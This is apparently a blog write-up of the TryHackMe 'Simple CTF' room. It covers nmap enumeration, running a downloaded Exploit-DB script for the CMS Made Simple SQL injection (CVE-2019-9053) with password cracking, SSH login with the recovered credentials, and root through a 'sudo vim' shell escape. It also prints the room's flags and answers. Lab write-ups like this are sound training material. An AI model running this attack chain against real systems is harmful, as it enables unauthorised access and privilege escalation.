---
title: "Challenges: Simple CTF (TryHackMe)"
datePublished: Thu Jun 19 2025 19:48:46 GMT+0000 (Coordinated Universal Time)
cuid: cmc3snl3a000m02l4bkt01pzw
slug: challenges-simple-ctf-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1750362431586/180cdf48-3564-4c60-a603-6cbd692ea54b.png
tags: tryhackme, sqlinjection, cve, ctf-writeup

---

In this walkthrough, I’ll be going through the [**Simple CTF**](https://tryhackme.com/room/easyctf) room on TryHackMe — a beginner-friendly challenge that touches on core penetration testing techniques. This room involves basic enumeration, discovering a vulnerable CMS, exploiting SQL injection (CVE-2019-9053), and using common Linux privilege escalation methods.

The goal is to gain initial access, escalate privileges, and retrieve both the **user** and **root** flags while understanding how each step reflects real-world attack scenarios.  

Deploy the machine and attempt the questions!

## Answer the questions below

1. How many services are running under port 1000? `2`  
      
    `nmap -p- 1-999 <target_ip>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750359544504/064050b1-5458-409a-b3ac-8d6b64a910e5.png align="center")
    
2. What is running on the higher port? `ssh`  
      
    `nmap -sV <target_ip>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750359590912/63894eb1-808f-4c55-9251-d7073e109d53.png align="center")
    
3. What's the CVE you're using against the application? `CVE-2019-9053`  
      
    cpe:/o:linux:linux\_kernel 5.15.0-124-generic  
    
    The hint: *An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1\_idlist parameter.*
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750359686784/9d5e82ef-a43e-4ba9-8d4d-6b5cb5bdfea2.png align="center")
    
    `hostnamectl`  
    
    Searching the CMS Made Simple 2.2.8 brings up the [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)  
    
4. To what kind of vulnerability is the application vulnerable? `sqli` (SQL Injection)  
      
    `wget https://www.exploit-db.com/raw/46635 -O exploit.py`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750359870216/a907d405-fdb1-4118-9ed6-ac5115f96fa0.png align="center")
    
    `pip install termcolor`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750359934462/6feb685d-d99a-434b-844c-102a1b5853e7.png align="center")
    
    `python exploit.py -u http://<target_ip>/simple --crack -w /usr/share/wordlists/rockyou.txt`
    
5. What's the password? `secret`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360030309/fad88ec8-9bd7-45b8-a63e-8b2e24333914.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360218742/6aafcebf-7c1b-458f-be6d-8b7cd657e181.png align="center")
    
6. Where can you login with the details obtained? `ssh`  
      
    `ssh mitch@<Target_Ip> -p 2222`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360246122/2bfd80a2-faa8-4140-aa6a-2d3e0b851615.png align="center")
    
7. What's the user flag? `G00d j0b, keep up!`  
      
    `ls -la`  
      
    `cat user.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360335521/2c9296cc-a4c6-4b5b-94a7-d847c2e9f5bc.png align="center")
    
8. Is there any other user in the home directory? What's its name? `sunbath`  
      
    `ls /home`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360353866/d3952538-9531-4cb7-a7e8-97edb0060f69.png align="center")
    
9. What can you leverage to spawn a privileged shell? `vim`  
      
    `.viminfo` - is the hint  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360705745/b5d13c27-dbc7-4f37-b279-39d4a2202901.png align="center")
    
    Use sudo vim from [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) - option one
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750360956379/57e85e8b-bf38-4baf-b591-cc45db9f14a6.png align="center")
    
    `sudo vim -c ‘:!/bin/sh’`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750361054425/7db8759d-09de-4b63-9ddd-2ba9eab3a542.png align="center")
    
10. What's the root flag? `W3ll d0n3. You made it!`
    
      
    `cd ../../root`  
      
    `cat root.txt`  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750361147904/2f8ea02b-4908-44e3-aa3b-34ace7c96542.png align="center")
    

The simple CTF room was a great reminder that even small misconfigurations can lead to complete system compromise. From identifying services with Nmap to exploiting a known CVE in CMS Made Simple and leveraging `vim` For privilege escalation, this challenge reinforces the importance of enumeration and tool familiarity.

  
Thanks for reading! Stay sharp, keep learning, and hack responsibly 🛡️  
*“Simple” challenges like these often carry big lessons.*